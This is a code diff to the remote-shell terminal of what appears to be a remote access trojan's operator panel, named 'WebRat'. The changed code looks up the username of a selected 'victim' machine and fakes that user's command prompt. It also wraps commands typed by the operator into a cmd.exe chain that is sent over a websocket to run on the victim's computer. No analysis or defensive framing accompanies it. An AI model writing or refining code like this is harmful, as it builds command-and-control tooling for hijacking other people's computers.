@@ -16,8 +16,21 @@ export function TerminalSection() {
         const sendBtn = document.getElementById("terminalSendBtn") as HTMLButtonElement | null;
         if (!consoleEl || !inputEl || !sendBtn) return;
 
-        let terminalUser = "user";
         let terminalCwd = "";
+
+        const resolveVictimUser = (): string => {
+            try {
+                const snap = detail.victimSnapshots?.[detail.selectedVictimId ?? ""];
+                if (snap && typeof (snap as Record<string, unknown>).user === "string") {
+                    const raw = String((snap as Record<string, unknown>).user).trim();
+                    if (raw) {
+                        const parts = raw.split("\\");
+                        return parts[parts.length - 1];
+                    }
+                }
+            } catch { }
+            return "";
+        };
 
         const w = window as unknown as Window & {
             WebRatAppendTerminalOutput?: (text: string) => void;
@@ -25,11 +38,9 @@ export function TerminalSection() {
         };
 
         const getPromptPrefix = () => {
-            const userName = terminalUser || "user";
-            terminalUser = userName;
-            const defaultCwd = `C:\\Users\\${userName}`;
-            if (!terminalCwd) terminalCwd = defaultCwd;
-            return `${terminalCwd}>`;
+            if (terminalCwd) return `${terminalCwd}>`;
+            const uname = resolveVictimUser();
+            return uname ? `C:\\Users\\${uname}>` : `C:\\>`;
         };
 
         const appendLine = (prefix: string, text: string) => {
@@ -46,7 +57,18 @@ export function TerminalSection() {
             consoleEl.scrollTop = consoleEl.scrollHeight;
         };
 
+        const hasTrailingPrompt = () => {
+            const last = consoleEl.lastElementChild;
+            if (!last) return false;
+            const pref = last.querySelector(".terminal-line-prefix");
+            const txt = last.querySelector(".terminal-line-text");
+            return !!(pref && txt && (txt.textContent || "").trim() === "");
+        };
+
         w.WebRatAppendTerminalOutput = (text: string) => {
+            if (hasTrailingPrompt()) {
+                consoleEl.removeChild(consoleEl.lastElementChild!);
+            }
             const lines = String(text || "").split(/\r?\n/);
             lines.forEach((ln) => {
                 if (!ln) return;
@@ -93,9 +115,9 @@ export function TerminalSection() {
                 return;
             }
 
-            const cwd = terminalCwd || getPromptPrefix().replace(/>\s*$/, "");
-            const safeCwd = String(cwd).replace(/"/g, "");
-            const wrappedCmd = `chcp 65001>nul & cd /d "${safeCwd}" & ${raw} & echo __webrat_cwd__%CD%`;
+            const cwd = terminalCwd || "";
+            const cdPart = cwd ? `cd /d "${String(cwd).replace(/"/g, "")}" & ` : "";
+            const wrappedCmd = `chcp 65001>nul & ${cdPart}${raw} & echo __webrat_cwd__%CD%`;
 
             const ok = ws.sendJson({
                 type: "command",
